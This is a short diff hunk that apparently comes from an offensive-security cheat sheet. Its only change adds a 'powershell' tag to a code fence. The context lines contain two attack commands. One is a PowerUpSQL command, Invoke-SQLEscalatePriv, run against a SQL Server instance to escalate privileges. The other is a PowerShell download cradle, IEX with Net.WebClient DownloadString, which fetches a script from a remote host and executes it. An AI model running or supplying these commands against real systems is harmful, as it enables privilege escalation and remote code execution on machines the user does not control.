@@ -248,7 +248,7 @@ Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"
 
 # Download Cardles
 
-```
+```powershell
 # normal download cradle
 IEX (New-Object Net.Webclient).downloadstring("http://192.168.X.X/script.ps1")
 
